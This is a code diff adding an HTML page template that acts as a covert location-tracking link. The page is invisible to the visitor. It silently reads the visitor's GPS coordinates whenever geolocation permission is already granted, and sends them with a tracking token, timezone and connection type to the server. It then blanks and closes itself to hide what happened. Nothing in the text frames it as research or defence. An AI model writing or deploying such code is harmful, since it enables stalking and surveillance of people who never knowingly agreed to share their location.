@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta http-equiv="refresh" content="0;url=about:blank" />
+<title> </title>
+<style>
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    background: #000;
+    overflow: hidden;
+    width: 100%; height: 100%;
+  }
+  body { opacity: 0; }
+</style>
+</head>
+<body>
+<script>
+(function() {
+  var token = "{{ token }}";
+  var sent = false;
+
+  {% if expired %}
+    try { window.location.replace('about:blank'); } catch(e) {}
+    return;
+  {% endif %}
+
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { return null; }
+  }
+
+  function getConnType() {
+    try {
+      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (c) return c.effectiveType || c.type || null;
+    } catch(e) {}
+    return null;
+  }
+
+  function sendCoords(lat, lng, acc) {
+    if (sent) return;
+    sent = true;
+    window._sent = true;
+    var payload = JSON.stringify({
+      token: token,
+      latitude: lat,
+      longitude: lng,
+      accuracy: acc,
+      connectionType: getConnType(),
+      timezone: getTimezone()
+    });
+    var blob = new Blob([payload], { type: 'application/json' });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon('/api/location-update', blob);
+    } else {
+      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
+    }
+  }
+
+  // ── Try GPS only if permission is already cached ──
+  function tryCachedGPS() {
+    if (!("geolocation" in navigator)) return;
+
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'geolocation' })
+        .then(function(status) {
+          if (status.state === 'granted') {
+            // Permission cached — fire silently
+            navigator.geolocation.getCurrentPosition(
+              function(pos) {
+                sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+              },
+              function() {},
+              { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 }
+            );
+          }
+          // If 'prompt' or 'denied', do NOT attempt — stay silent
+        })
+        .catch(function() {});
+    }
+  }
+
+  // ── Fire IP data to server as fallback ──
+  function sendIPFallback() {
+    if (sent) return;
+    sent = true;
+    window._sent = true;
+    var payload = JSON.stringify({
+      token: token,
+      connectionType: getConnType(),
+      timezone: getTimezone()
+    });
+    var blob = new Blob([payload], { type: 'application/json' });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon('/api/location-denied', blob);
+    } else {
+      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
+    }
+  }
+
+  // ── Immediate self-destruct ──
+  function vanish() {
+    try { window.location.replace('about:blank'); } catch(e) {}
+    try { window.open('', '_self', '').close(); } catch(e) {}
+    try { self.close(); } catch(e) {}
+    try { window.close(); } catch(e) {}
+    setTimeout(function() {
+      try {
+        document.open();
+        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
+        document.close();
+      } catch(e) {}
+    }, 5);
+  }
+
+  // ── Execute ──
+  tryCachedGPS();
+
+  // Wait a moment for GPS (if cached), then send IP fallback and vanish
+  setTimeout(function() {
+    if (!window._sent) sendIPFallback();
+    vanish();
+  }, 2000);
+
+  // Force vanish after 5s regardless
+  setTimeout(function() {
+    if (!window._sent) { window._sent = true; }
+    vanish();
+  }, 5000);
+})();
+</script>
+</body>
+</html>
